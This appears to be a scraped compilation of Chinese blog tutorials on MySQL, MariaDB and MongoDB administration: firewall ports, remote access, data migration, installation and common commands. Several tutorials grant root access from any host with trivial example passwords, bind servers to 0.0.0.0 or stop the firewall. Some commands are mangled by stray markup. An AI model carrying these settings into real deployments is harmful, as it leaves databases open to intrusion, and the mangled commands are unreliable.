ACCEPT</p>\n<p>开启3306端口监听，开启后如下图</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510165145196-812431589.png\" alt=\"img\"></p>\n<p> <strong>扩展知识</strong></p>\n<p>防火墙其他相关操作</p>\n<p>临时关闭防火墙服务<br>service iptables stop</p>\n<p>开启防火墙服务<br>service iptables start</p>\n<p>开机不再启动防火墙服务<br>chkconfig iptables off</p>\n<p><strong>问题2</strong></p>\n<p>远程链接了一下MySQL，出现了以下错误，查了一下，是因为MySQL没有允许远程登陆，所以要授权MySQL远程登陆。</p>\n<p>　　<img src=\"https://images2015.cnblogs.com/blog/982624/201610/982624-20161025172005421-490284238.png\" alt=\"img\"></p>\n<p> 从任何主机上使用root用户，密码：yourpassword（你的root密码）连接到mysql服务器：<br>　　# mysql -u root -proot<br>　　mysql&gt;GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘yourpassword’ WITH GRANT OPTION;</p>\n<p>　　操作完后切记执行以下命令刷新权限<br>　　 FLUSH PRIVILEGES</p>\n<p> 　这时再通过navicat远程链接MySQL，链接测试，如下图，成功。</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510171925473-2058049608.png\" alt=\"img\"></p>\n<p> 分类: <a href=\"https://www.cnblogs.com/brankoliu/category/1461963.html\">MySQL</a></p>\n<h1 id=\"MariaDB-数据库迁移\"><a href=\"#MariaDB-数据库迁移\" class=\"headerlink\" title=\"*MariaDB* *数据库迁移*\"></a><a href=\"https://blog.csdn.net/weixin_30567225/article/details/95318407\">*<strong>MariaDB* *数据库迁移*</strong></a></h1><p>2018-02-26 12:35:00</p>\n<h3 id=\"一、为什么要迁移\"><a href=\"#一、为什么要迁移\" class=\"headerlink\" title=\"一、为什么要迁移\"></a>一、为什么要迁移</h3><p>我的七月小说站点放在JCloud上，恕我直言，配合我的Aliyun服务器进行数据交互，那是相当的慢，没办法，京东云上面十几块钱的公网ip，也就这样了。<br>所以我决定把web服务器和数据库部署到一起。</p>\n<h3 id=\"二、迁移前导步骤\"><a href=\"#二、迁移前导步骤\" class=\"headerlink\" title=\"二、迁移前导步骤\"></a>二、迁移前导步骤</h3><p>迁移过程中顺便记录一手，供后面再次迁移到别的服务器上查阅，省的麻烦。<br>服务器是CentOS 7.4<br>1.再次安装MariaDB<br><code>yum -y install mariadb mariadb-server</code><br>2.启动MariaDB<br><code>systemctl start mariadb</code><br>3.设置开机自启<br><code>systemctl enable mariadb</code><br>4.简单配置一下<br><code>mysql_secure_installation</code><br>5.进入用户，配置权限</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">use mysql;</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">user</span> <span class=\"string\">&#x27;jiajin&#x27;</span>@<span class=\"string\">&#x27;%&#x27;</span> IDENTIFIED <span class=\"keyword\">BY</span> <span class=\"string\">&#x27;your password&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">grant</span>  <span class=\"keyword\">all</span>  <span class=\"keyword\">on</span> <span class=\"operator\">*</span>.<span class=\"operator\">*</span> <span class=\"keyword\">to</span> jiajin@<span class=\"string\">&#x27;%&#x27;</span>;</span><br><span class=\"line\">quit;</span><br><span class=\"line\">flush privileges; </span><br></pre></td></tr></table></figure>\n\n<p>6.字符集配置<br>进入my.cnf<code>vi /etc/my.cnf</code><br>在[msqld]标签下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">init_connect=&#x27;SET collation_connection = utf8_unicode_ci&#x27; </span><br><span class=\"line\">init_connect=&#x27;SET NAMES utf8&#x27; </span><br><span class=\"line\">character-set-server=utf8 </span><br><span class=\"line\">collation-server=utf8_unicode_ci </span><br><span class=\"line\">skip-character-set-client-handshake</span><br></pre></td></tr></table></figure>\n\n<p>进入文件/etc/my.cnf.d/client.cnf<br>在[client]中添加<code>default-character-set=utf8</code><br>进入文件/etc/my.cnf.d/mysql-clients.cnf<br>在[mysql]中添加<code>default-character-set=utf8</code><br>好了，重启MariaDB<code>systemctl restart mariadb</code><br>创建数据库<code>create database novel</code></p>\n<h3 id=\"三、迁移数据库表和结构\"><a href=\"#三、迁移数据库表和结构\" class=\"headerlink\" title=\"三、迁移数据库表和结构\"></a>三、迁移数据库表和结构</h3><p>先cd到mysql的运行路径下，再执行一下命令：<br>1.导出数据和表结构：<br>mysqldump -u用户名 -p密码 数据库名 &gt; 数据库名.sql<br>mysqldump -uroot -p dbname &gt; dbname .sql<br>敲回车后会提示输入密码<br>2.只导出表结构<br>mysqldump -u用户名 -p密码 -d 数据库名 &gt; 数据库名.sql<br>mysqldump -uroot -p -d dbname &gt; dbname .sql<br>3.导入数据库<br>方法一：<br>（1）选择数据库<br>mysql&gt;use dbname ;<br>（2）设置数据库编码<br>mysql&gt;set names utf8;<br>（3）导入数据（注意sql文件的路径）<br>mysql&gt;source /home/xxxx/dbname .sql;<br>方法二：<br>mysql -u用户名 -p密码 数据库名 &lt; 数据库名.sql</p>\n<p>转载于:<a href=\"https://www.cnblogs.com/jiajin/p/8472590.html\">https://www.cnblogs.com/jiajin/p/8472590.html</a></p>\n<p>更多相关内容</p>\n<ul>\n<li><p><a href=\"https://blog.csdn.net/weixin_32296621/article/details/116336226\">使用Oracle SQL Developer工具完成<em>Mariadb数据库迁移</em>到Oracle数据库</a>2021-05-02 01:14:32</p>\n<p>Oracle SQL Developer 是一个免费的集成开发环境，简化了传统部署和云部署中 Oracle 数据库的开发和管理。SQL Developer 提供完整的端到端的 PL/SQL 应用开发，包括一个用于运行查询和脚本的工作表，一个用于管理数据库的 DBA 控制台，一个报告界面、一个全面的数据建模解决方案，以及一个用于将您的第三方数据库迁移到 Oracle 的迁移平台。</p>\n<p>“我们很高兴看到 Oracle SQL Developer 得到了广泛应用。开发人员社区已经接受 SQL Developer 作为设计、开发和 DBA 活动的事实上的标准数据库 IDE。”— Oracle 数据库工具副总裁 Michael J. Hichwa</p>\n<p>一、准备工作</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/f221a66d277cbb730b0e9f190ad4fe5f.png\" alt=\"f221a66d277cbb730b0e9f190ad4fe5f.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/693a8fd569b1b35f7dfd7ebfda73f289.png\" alt=\"693a8fd569b1b35f7dfd7ebfda73f289.png\"></p>\n<p>二、设置Oracle SQL Developer中文界面</p>\n<p>首先，找到Oracle SQL Developer的安装目录；随后，在“ide\\bin”目录下打开ide.conf文件；然后，将AddVMOption -Duser.language=zh 与 AddVMOption -Duser.country=CN 各占一行写入。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/0feb3337070f70fb55231b1178a9d5fc.png\" alt=\"0feb3337070f70fb55231b1178a9d5fc.png\"></p>\n<p>最后，保存文件，重启Oracle Oracle SQL Developer.</p>\n<p>三、设置Oracle SQL Developer的Mysql支持插件</p>\n<p>Oracle SQL Developer安装完后需要在工具–首选项–数据库–第三方JDBC驱动程序窗口添加刚才下载的mysql-connector-java-8.0.23.jar</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/5c6a36cf122e61caee948b72673ad24c.png\" alt=\"5c6a36cf122e61caee948b72673ad24c.png\"></p>\n<p>四、开始准备迁移数据库</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/cb71e928231476e69e2c195a1868ee48.png\" alt=\"cb71e928231476e69e2c195a1868ee48.png\"></p>\n<p>在oracle库上右键选择‘关联迁移库资料档案库’菜单</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/47d5d4be1dbbf8a5fd33a4e5ebd6c215.png\" alt=\"47d5d4be1dbbf8a5fd33a4e5ebd6c215.png\"></p>\n<p>在Mariadb库上右键选择‘迁移到Oracle…’菜单</p>\n<p>五、开始迁移数据库</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/7040272255f04a1c59ea3e1c37e1d220.png\" alt=\"7040272255f04a1c59ea3e1c37e1d220.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/59ddefa38bc62c0568421fc67a4d0273.png\" alt=\"59ddefa38bc62c0568421fc67a4d0273.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/a10cf2c2e3039b68f36dba8fa3a196a8.png\" alt=\"a10cf2c2e3039b68f36dba8fa3a196a8.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/034acad5de6e66d410ed78043ff30c21.png\" alt=\"034acad5de6e66d410ed78043ff30c21.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/7d377c042ab595db5a1bbec9d79159f1.png\" alt=\"7d377c042ab595db5a1bbec9d79159f1.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/781c260276dff5b06b26cdf073cd47a9.png\" alt=\"781c260276dff5b06b26cdf073cd47a9.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/ec5b6c391abd600457a95efb2b1875cf.png\" alt=\"ec5b6c391abd600457a95efb2b1875cf.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/e14eb42dfc39443aca2b6e3a44cd649c.png\" alt=\"e14eb42dfc39443aca2b6e3a44cd649c.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/33abd2ea081756457d59c06a5162a608.png\" alt=\"33abd2ea081756457d59c06a5162a608.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/07441a26d39e163a0e9f338244caffca.png\" alt=\"07441a26d39e163a0e9f338244caffca.png\"></p>\n<p>恭喜您，迁移成功！</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/b41a3a478391653c2a0eb8246a5012c2.png\" alt=\"b41a3a478391653c2a0eb8246a5012c2.png\"></p>\n<p>六、扫尾工作</p>\n<p>Oracle执行了第三步‘关联迁移库资料档案库’菜单后，可以打开之前的连接查看，会生成一些表格，是用于在数据迁移过程中记录相关数据；所以迁移完成后，需要删除oracle库中这些多余的表：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/de5b8b22ea15a3877d9996a0d7d49f85.png\" alt=\"de5b8b22ea15a3877d9996a0d7d49f85.png\"></p>\n<p>在oracle库上右键选择‘删除迁移库资料档案库’菜单</p>\n<p>七、最终成果展示</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/516e37447b9ee16a2afff66887a2a009.png\" alt=\"516e37447b9ee16a2afff66887a2a009.png\"></p>\n<p>OK，欢迎大家持续关注潤沁實業教育领域潤沁網路大學系列课程。</p>\n<p>原文：<a href=\"https://www.cnblogs.com/runqinshiye/p/14444912.html\">https://www.cnblogs.com/runqinshiye/p/14444912.html</a></p>\n<p><a href=\"javascript:;\">收起 <img src=\"https://csdnimg.cn/release/aggregate/img/arrow-down@2x.png\" alt=\"img\"></a></p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/jzdriver/article/details/104747448/?utm_term=mariadb%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%81%E7%A7%BB&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-104747448-null-null&spm=3001.4430\"><em>MariaDB</em> 10.5 <em>迁移</em> datadir <em>数据库</em>目录 到 /home文件夹下</a></p>\n<p>执行mysql_secure_installation 或 mysql_install_db –user=mysql 进行常规安装 执行systemctl start <em>mariadb</em> 启动<em>数据库</em>———(截止这步,都是常规安装) 确认<em>数据库</em>正常后,开始目录<em>迁移</em> 执行cp …</p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/YABIGNSHI/article/details/120284067?utm_term=mariadb%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%81%E7%A7%BB&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-120284067-null-null&spm=3001.4430\">…套<em>mariadb</em>+maxscale上_雅冰石的博客_<em>mariadb 数据迁移</em></a></p>\n<p>先将目标端的<em>mariadb</em>主库临时成为源端主库的从库,进行主从复制,从而保证数据同步,避免影响业务,然后切程序里连的<em>数据库</em>代理ip。 3.1 修改目标端主库的server_id #由于源端和目标端的server_id冲突,因此这里需要改下目标端主库的serve…</p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/wxlbrxhb/article/details/115632404\"><em>mariadb</em>数据文件<em>迁移</em></a>2021-04-12 17:48:09</p>\n<p>1、首先启动mariadb数据库，由于初次配置时会报错，所以这里我们重启他一次。<br>systemctl restart mariadb.service<br><img src=\"https://img-blog.csdnimg.cn/20210412174840269.jpg#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>2、输入mysql_secure_installation，下面的各类选项，比如设置密码、是否删除测试库等等根据需要选择即可。<br><img src=\"https://img-blog.csdnimg.cn/20210412174856435.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d4bGJyeGhi,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>3、停止mariadb数据库，systemctl stop mariadb.service，因为数据库的数据文件在运行状态的时候是无法迁移的。<br><img src=\"https://img-blog.csdnimg.cn/20210412174916377.jpg#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>4、创建需要存放数据库文件的目录，mkdir –p/home/data/mysql<br><img src=\"https://img-blog.csdnimg.cn/20210412174940714.jpg#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>5、对新建的目录进行授权，chown –R mysql:mysql /home/data/mysql<br><img src=\"https://img-blog.csdnimg.cn/20210412175216202.jpg#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>6、将原mariadb数据库的数据文件复制到新的目录中，默认数据文件相关的东西都在/var/lib/mysql/目录下，cp –a /var/lib/mysql/* /home/data/mysql/<br><img src=\"https://img-blog.csdnimg.cn/20210412175155237.jpg#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>7、编辑/etc/my.cnf文件，将其中的datadir后面的目录改成新建的目录。<br><img src=\"https://img-blog.csdnimg.cn/20210412175130428.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d4bGJyeGhi,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>8、启动mariadb数据库，登录数据库之后输入命令show global variables like “%datadir%”，如果出现新目录为新目录则修改成功。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20210412175052202.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d4bGJyeGhi,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p><a href=\"javascript:;\">收起 <img src=\"https://csdnimg.cn/release/aggregate/img/arrow-down@2x.png\" alt=\"img\"></a></p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/Max_fzy/article/details/109686432\"><em>mariaDB数据库</em>转移mysql数据库</a>2020-11-14 09:36:30</p>\n<p>由于现在mysql处于开源状态，有部分用户已经在使用mariaDB了。</p>\n<p>但是当原本有mysql数据库的情况下又有mariaDB。怎么把mariaDB数据库的表和数据导入到Mysql数据库里。</p>\n<p>mariaDB数据库转换mysql 不能直接导出SQL+数据 需要分开用模型导出建表语句和再导出SQL数据,两者的差异参考以下示例。</p>\n<p>mariaDB导出的SQL对字段使用 “ 双引号标识，而mysql则使用 ` 进行标识。</p>\n<p>mariaDb导出示例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">CREATE TABLE <span class=\"string\">&quot;gl_activity&quot;</span> (</span><br><span class=\"line\">  <span class=\"string\">&quot;act_id&quot;</span> <span class=\"keyword\">int</span>(<span class=\"number\">10</span>) unsigned NOT <span class=\"literal\">NULL</span> AUTO_INCREMENT COMMENT <span class=\"string\">&#x27;主键ID&#x27;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;actname&quot;</span> <span class=\"title function_ invoke__\">varchar</span>(<span class=\"number\">50</span>) DEFAULT <span class=\"literal\">NULL</span> COMMENT <span class=\"string\">&#x27;活动名称&#x27;</span>,</span><br><span class=\"line\">  PRIMARY <span class=\"title function_ invoke__\">KEY</span> (<span class=\"string\">&quot;act_id&quot;</span>)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20201114092202535.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>mysql导出示例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">CREATE TABLE `gl_activity` (</span><br><span class=\"line\">`act_id` <span class=\"keyword\">int</span>(<span class=\"number\">10</span>) UNSIGNED NOT <span class=\"literal\">NULL</span> AUTO_INCREMENT COMMENT <span class=\"string\">&#x27;主键ID&#x27;</span>,</span><br><span class=\"line\">`actname` <span class=\"title function_ invoke__\">varchar</span>(<span class=\"number\">50</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class=\"literal\">NULL</span> DEFAULT <span class=\"literal\">NULL</span> COMMENT <span class=\"string\">&#x27;活动名称&#x27;</span>,</span><br><span class=\"line\">PRIMARY <span class=\"title function_ invoke__\">KEY</span> (`act_id`) </span><br><span class=\"line\">)</span><br><span class=\"line\">ENGINE=InnoDB</span><br><span class=\"line\">DEFAULT CHARACTER SET=utf8 COLLATE=utf8_general_ci</span><br><span class=\"line\">AUTO_INCREMENT=<span class=\"number\">4</span></span><br><span class=\"line\">COMMENT=<span class=\"string\">&#x27;活动表&#x27;</span></span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20201114092241743.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n</li>\n</ul>\n<h1 id=\"Centos环境下安装mongoDB\"><a href=\"#Centos环境下安装mongoDB\" class=\"headerlink\" title=\"Centos环境下安装mongoDB\"></a><a href=\"https://www.cnblogs.com/layezi/p/7290082.html\">Centos环境下安装mongoDB</a></h1><p>安装前注意: 此教程是通过yum安装的.仅限64位centos系统</p>\n<p>安装步骤:</p>\n<p>1、创建仓库文件: </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi /etc/yum.repos.d/mongodb-org-3.4.repo</span><br></pre></td></tr></table></figure>\n\n<p> 然后复制下面配置,保存退出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[mongodb-org-3.4]``name=MongoDB Repository``baseurl=https:``//repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.4/x86_64/``gpgcheck=1``enabled=1``gpgkey=https:``//www.mongodb.org/static/pgp/server-3.4.asc</span><br></pre></td></tr></table></figure>\n\n<p> 2、yum安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y mongodb-org</span><br></pre></td></tr></table></figure>\n\n<p> 没有权限就在前面加:  sudo</p>\n<p>安装完毕后修改配置文件:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi /etc/mongod.conf</span><br></pre></td></tr></table></figure>\n\n<p> 修改配置文件的 <code>bind_ip,</code> 默认是 <code>127.0.0.1 只限于本机连接</code>。所以安装完成后必须把这个修改为 0.0.0.0 ,否则通过别的机器是没法连接的!</p>\n<p>3、启动、停止、重启</p>\n<p>MongoDB默认将数据文件存储在<code>/var/lib/mongo</code>目录，默认日志文件在<code>/var/log/mongodb</code>中。如果要修改,可以在 <code>/etc/mongod.conf</code> 配置中指定备用日志和数据文件目录。</p>\n<p>启动命令:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">service mongod start</span><br></pre></td></tr></table></figure>\n\n<p> 停止命令:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">service mongod stop</span><br></pre></td></tr></table></figure>\n\n<p> 重启命令:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">service mongod restart</span><br></pre></td></tr></table></figure>\n\n<p>查看mongoDB是否启动成功:</p>\n<p>可以通过查看日志文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /``var``/log/mongodb/mongod.log</span><br></pre></td></tr></table></figure>\n\n<p> 日志文件应该会出现如下一句说明</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[initandlisten] waiting for connections on port &lt;port&gt;</span><br></pre></td></tr></table></figure>\n\n<p><port> 是mongodb运行端口</p>\n<p>设置开机启动</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">chkconfig mongod ``on</span><br></pre></td></tr></table></figure>\n\n<p> 4、使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@instance-d0nk2r2c ~]# mongo` `## 查看数据库``&gt; show dbs;` `## 查看数据库版本``&gt; db.version();` `## 常用命令帮助``&gt; db.help();</span><br></pre></td></tr></table></figure>\n\n<p> 5、卸载移除mongo</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum erase $(rpm -qa | grep mongodb-org)</span><br></pre></td></tr></table></figure>\n\n<p> 6、移除数据库文件和日志文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rm -r /``var``/log/mongodb``rm -r /``var``/lib/mongo</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://docs.mongodb.com/master/tutorial/install-mongodb-on-red-hat/\">https://docs.mongodb.com/master/tutorial/install-mongodb-on-red-hat/</a></p>\n<p>个人博客: <a href=\"https://lanxy.top/\">https://lanxy.top</a></p>\n<h1 id=\"本地连不上远程虚拟机的mysql\"><a href=\"#本地连不上远程虚拟机的mysql\" class=\"headerlink\" title=\"本地连不上远程虚拟机的mysql\"></a>本地连不上远程虚拟机的mysql</h1><p>一、写于2019.12.23</p>\n<p>navicat：不修改数据库配置的情况下直接连接【先配置SSH，就是putty或者xshell远程连接的方式连接，然后再配置常规，主机localhost即可，相当于进入主机之后操作的数据库，完美！！】</p>\n<p> 二、写于2019.6.14</p>\n<p>虚拟机新装mysql时，由于权限不够，本地连不上，只能在虚拟机内部mysql操作。</p>\n<p>1、首先sufo ufw status查看防火墙是否开启，状态为inactive说明没有开启防火墙。</p>\n<p>2、然后输入netstat -an|grep 3306查看端口启动和占用情况，可以看到绑定为127.0.0.1，这块需要我们修改为0.0.0.0。3、进入虚拟机，修改mysql访问权限，依次执行</p>\n<p>mysql -uroot -p</p>\n<p>use mysql;<br>4、更新某一条mysql用户的权限（新装的mysql可以不执行第四步）</p>\n<p>select host,user from user where user=’root’;<br>//如果上面查询到有信息,但host为localhost或其他值，就需要根据实际需求来更新表信息<br>//host代表本地可以访问<br>update user set host=’%’ where user=’root’ # 如果想任何的IP地址都可以使用root用户来远程登陆（注意如果上面的查询语句，查询出来有多条，就需要做一些处理，比如多加一个条件如 where user=’root’ and host=’localhost’或先删除其他人记录只保存一条user=’root’的记录）<br>5、指定所有客户端都可以使用root账户访问mysql。</p>\n<p>//更改权限 语法模板<br>grant all privileges on 库名.表名 to ‘用户名‘@’IP地址’ identified by ‘密码’ with grant option;</p>\n<p>//指定所有客户端都可以使用root账户访问mysql。<br>grant all privileges on <em>.</em> to ‘root‘@’%’ identified by ‘123456’ with grant option;<br>flush privileges;</p>\n<p>//退出mysql，重启服务<br>exit;<br>sudo service mysql restart</p>\n<p>注释：<br>库名:要远程访问的数据库名称,所有的数据库使用“<em>”<br>表名:要远程访问的数据库下的表的名称，所有的表使用“</em>”<br>用户名:要赋给远程访问权限的用户名称<br>IP地址:可以远程访问的电脑的IP地址，所有的地址使用“%”<br>密码:要赋给远程访问权限的用户对应使用的密码</p>\n<p>5、输入sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf  ,修改mysql配置文件。</p>\n<p>将bind-address修改127.0.0.1为0.0.0.0。</p>\n<p>最后，重新输入账号密码就可以了。参考链接</p>\n<h1 id=\"Mariadb-Mysql命令行常用命令\"><a href=\"#Mariadb-Mysql命令行常用命令\" class=\"headerlink\" title=\"Mariadb/Mysql命令行常用命令\"></a>Mariadb/Mysql命令行常用命令</h1><p><img src=\"https://csdnimg.cn/release/blogv2/dist/pc/img/reprint.png\" alt=\"img\"></p>\n<p><a href=\"https://blog.csdn.net/weixin_30708329\">weixin_30708329</a><img src=\"https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png\" alt=\"img\">于 2019-05-21 17:58:00 发布<img src=\"https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png\" alt=\"img\">146</p>\n<h2 id=\"一、初始化等\"><a href=\"#一、初始化等\" class=\"headerlink\" title=\"一、初始化等\"></a>一、初始化等</h2><h3 id=\"1、登陆数据库方法\"><a href=\"#1、登陆数据库方法\" class=\"headerlink\" title=\"1、登陆数据库方法\"></a><strong>1、登陆数据库方法</strong></h3><p>　　　  mysql -u 用户名 -p 用户密码</p>\n<h3 id=\"2、修改root及用户密码\"><a href=\"#2、修改root及用户密码\" class=\"headerlink\" title=\"2、修改root及用户密码\"></a>2、修改root及用户密码</h3><p>　　　　use mysql;</p>\n<p>　　　　update user set password=password(‘11111111’) where user=’root’ and host=’localhost’;</p>\n<p>　　　　flush privileges;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [mysql]&gt; update user set password=password(&#x27;11111111&#x27;) where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;</span><br><span class=\"line\">Query OK, 1 row affected (0.01 sec)</span><br><span class=\"line\">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [mysql]&gt; flush privileges;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [mysql]&gt; exit</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、创建用户\"><a href=\"#3、创建用户\" class=\"headerlink\" title=\"3、创建用户\"></a><strong>3、创建用户</strong></h3><p>　　　　insert into mysql.user(host,user,password)values(“localhost”,”test”,password(“password”));</p>\n<p>　　　　flush privileges;</p>\n<h3 id=\"4、删除用户\"><a href=\"#4、删除用户\" class=\"headerlink\" title=\"4、删除用户\"></a>4、删除用户</h3><p>　　　　DELETE FROM user WHERE User=”test” and Host=”localhost”;<br>　　　　flush privileges;　　</p>\n<h3 id=\"5、删除用户的数据库\"><a href=\"#5、删除用户的数据库\" class=\"headerlink\" title=\"5、删除用户的数据库\"></a>5、删除用户的数据库</h3><p>　　　　drop database test1;</p>\n<h3 id=\"6、交互模式初始化\"><a href=\"#6、交互模式初始化\" class=\"headerlink\" title=\"6、交互模式初始化\"></a>6、交互模式初始化</h3><p>　　　　mysql_secure_installation</p>\n<h2 id=\"二、-常用操作\"><a href=\"#二、-常用操作\" class=\"headerlink\" title=\"二、 常用操作\"></a>二、 常用操作</h2><h3 id=\"1、显示数据库列表\"><a href=\"#1、显示数据库列表\" class=\"headerlink\" title=\"1、显示数据库列表\"></a><strong>1、显示数据库列表</strong></h3><p>　　　　show databases:查看所有的数据库</p>\n<h3 id=\"2、创建数据库\"><a href=\"#2、创建数据库\" class=\"headerlink\" title=\"2、创建数据库\"></a>2、创建数据库</h3><p>　　　　create database zxg：创建名尾zxg的数据库</p>\n<h3 id=\"3、进入数据库\"><a href=\"#3、进入数据库\" class=\"headerlink\" title=\"3、进入数据库\"></a>3、进入数据库</h3><p>　　　　use zxg:进入zxg的数据库</p>\n<h3 id=\"4、显示库中的数据表\"><a href=\"#4、显示库中的数据表\" class=\"headerlink\" title=\"4、显示库中的数据表\"></a>4、显示库中的数据表</h3><p>　　　　show tables：查看数据库里有多少张表</p>\n<h3 id=\"5、创建数据表\"><a href=\"#5、创建数据表\" class=\"headerlink\" title=\"5、创建数据表\"></a>5、创建数据表</h3><p>　　　　create table t1 (id varchar(20),name varchar(20)):创建名为t1表，并创建两两个字段，id、name，varchar表示设置数据长度，用字符来定义长度单位，其</p>\n<h3 id=\"6、插入数据\"><a href=\"#6、插入数据\" class=\"headerlink\" title=\"6、插入数据\"></a>6、插入数据</h3><p>　　　　insert into t1 values（”1”，”zxg”）:向表中插入数据</p>\n<h3 id=\"7、查看数据表\"><a href=\"#7、查看数据表\" class=\"headerlink\" title=\"7、查看数据表\"></a>7、查看数据表</h3><p>　　　　select * from t1 ：查看t1表数据内容</p>\n<h3 id=\"8、多条件查询\"><a href=\"#8、多条件查询\" class=\"headerlink\" title=\"8、多条件查询\"></a>8、多条件查询</h3><p>　　　　select * from t1 where id=1 and age = ‘zxg ‘ : id、age 多个条件查询</p>\n<h3 id=\"9、查看字段内容\"><a href=\"#9、查看字段内容\" class=\"headerlink\" title=\"9、查看字段内容\"></a>9、查看字段内容</h3><p>　　　　desc t1:查看t1 表字段内容</p>\n<h3 id=\"10、修改字段长度\"><a href=\"#10、修改字段长度\" class=\"headerlink\" title=\"10、修改字段长度\"></a>10、修改字段长度</h3><p>　　　　alter table t1 modify column name varchar(20):修改name字段的长度</p>\n<h3 id=\"11、修改该字段内容\"><a href=\"#11、修改该字段内容\" class=\"headerlink\" title=\"11、修改该字段内容\"></a>11、修改该字段内容</h3><p>　　　　update t1 set name=’zxg.net’ where id=1：修改name字段的内容</p>\n<h3 id=\"12、权限刷新\"><a href=\"#12、权限刷新\" class=\"headerlink\" title=\"12、权限刷新\"></a><strong>12、权限刷新</strong></h3><p>　　　